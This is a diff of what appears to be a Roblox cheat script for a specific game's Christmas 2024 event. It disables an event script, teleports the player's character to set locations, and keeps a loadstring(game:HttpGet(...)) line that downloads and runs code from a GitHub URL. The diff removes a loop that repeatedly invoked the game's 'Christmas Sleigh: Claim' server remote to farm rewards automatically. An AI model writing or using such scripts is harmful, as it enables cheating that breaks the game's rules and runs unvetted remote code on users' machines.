@@ -11,25 +11,10 @@ repeat
 
 until game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
 if game.PlaceId == 17503543197 then
-    game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Events.Christmas2024["Christmas Sleigh"].Parent = game:GetService("Lighting")
+    game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Events.Christmas2024["Polar Express"].Enabled = false
+    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.__THINGS.Instances.HolidayEvent.Teleports.Enter.CFrame
     task.wait(120)
-    game:GetService("Lighting")["Christmas Sleigh"].Parent = game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game
-    task.wait(1)
     game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2615.27588, 16.2414665, -20874.6172)
     task.wait(10)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/KqRs/Secretss/refs/heads/main/something",true))()
-    task.wait(10)
-    spawn(function()
-        while true do
-            for i,v in pairs(workspace:GetChildren()) do
-                if v:IsA("MeshPart") then
-                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Christmas Sleigh: Claim"):InvokeServer(v.Name)
-                    task.wait(.5)
-                    v:Destroy()
-                    task.wait(1)
-                end
-            end
-            task.wait(30)
-        end
-    end)
 end
